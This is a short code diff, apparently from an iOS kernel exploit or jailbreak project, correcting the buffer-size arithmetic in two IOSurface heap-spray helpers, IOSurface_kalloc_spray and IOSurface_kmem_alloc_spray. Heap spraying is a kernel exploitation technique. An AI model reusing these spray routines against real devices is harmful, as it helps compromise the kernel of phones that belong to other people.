@@ -133,7 +133,7 @@ int IOSurface_kalloc_spray(void *data, uint32_t size, int count, uint32_t kalloc
         return KERN_FAILURE;
     }
     
-    size_t args_size = sizeof(struct IOSurfaceValueArgs) + count * (((size + 3)/4) * 4) + 6 * 4 * count * 4;
+    size_t args_size = sizeof(struct IOSurfaceValueArgs) + count * (((size + 3)/4) * 4) + 6 * 4 + count * 4;
     
     struct IOSurfaceValueArgs *args = calloc(1, args_size);
     args->surface_id = IOSurface_ID;
@@ -229,7 +229,7 @@ int IOSurface_kmem_alloc_spray(void *data, uint32_t size, int count, uint32_t ka
         return KERN_FAILURE;
     }
     
-    size_t args_size = sizeof(struct IOSurfaceValueArgs) + count * (((size + 3)/4) * 4) + 6 * 4 * count * 4;
+    size_t args_size = sizeof(struct IOSurfaceValueArgs) + count * (((size + 3)/4) * 4) + 6 * 4 + count * 4;
     
     struct IOSurfaceValueArgs *args = calloc(1, args_size);
     args->surface_id = IOSurface_ID;
